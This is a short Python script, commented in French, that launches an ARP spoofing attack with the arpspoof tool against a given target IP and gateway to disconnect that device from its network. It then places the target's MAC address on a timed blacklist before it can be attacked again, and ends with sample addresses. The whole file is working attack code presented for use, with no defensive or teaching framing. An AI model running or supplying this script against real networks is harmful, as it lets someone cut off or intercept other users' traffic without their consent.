import time
import subprocess

# Liste noire temporaire des adresses MAC
blacklist = []

# Temps en secondes avant que la reconnexion soit autorisée (par exemple 30 minutes)
BLOCK_TIME = 30 * 60  # 30 minutes
MAX_BLOCK_TIME = 2 * 60 * 60  # 2 heures

# Fonction pour ajouter une adresse MAC à la liste noire
def add_to_blacklist(mac_address):
    if mac_address not in blacklist:
        blacklist.append({
            'mac': mac_address,
            'blocked_until': time.time() + BLOCK_TIME  # ou MAX_BLOCK_TIME pour plus de sécurité
        })
        print(f"{mac_address} ajouté à la liste noire. Blocage pendant {BLOCK_TIME // 60} minutes.")

# Fonction pour vérifier si une adresse MAC est bloquée
def is_blocked(mac_address):
    for entry in blacklist:
        if entry['mac'] == mac_address:
            if time.time() < entry['blocked_until']:
                return True
            else:
                blacklist.remove(entry)
                print(f"{mac_address} a été débloqué.")
                return False
    return False

# Fonction pour exécuter l'ARP Spoofing et gérer la reconnexion
def arp_spoof(target_ip, target_mac, gateway_ip, interface="eth0"):
    # Si la MAC est bloquée, on ne lance pas l'attaque
    if is_blocked(target_mac):
        print(f"Impossible de déconnecter {target_ip} ({target_mac}), déjà bloqué.\n")
        return

    # Sinon, procéder avec l'attaque ARP Spoofing
    print(f"[!] Lancement de l'attaque ARP Spoofing sur {target_ip} ({target_mac})...\n")
    subprocess.call(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip])
    print(f"[+] {target_ip} déconnecté du réseau.")
    add_to_blacklist(target_mac)

# Exemple d'utilisation
if __name__ == "__main__":
    target_ip = "192.168.1.10"
    target_mac = "00:14:22:01:23:45"
    gateway_ip = "192.168.1.1"  # IP de la passerelle
    arp_spoof(target_ip, target_mac, gateway_ip)
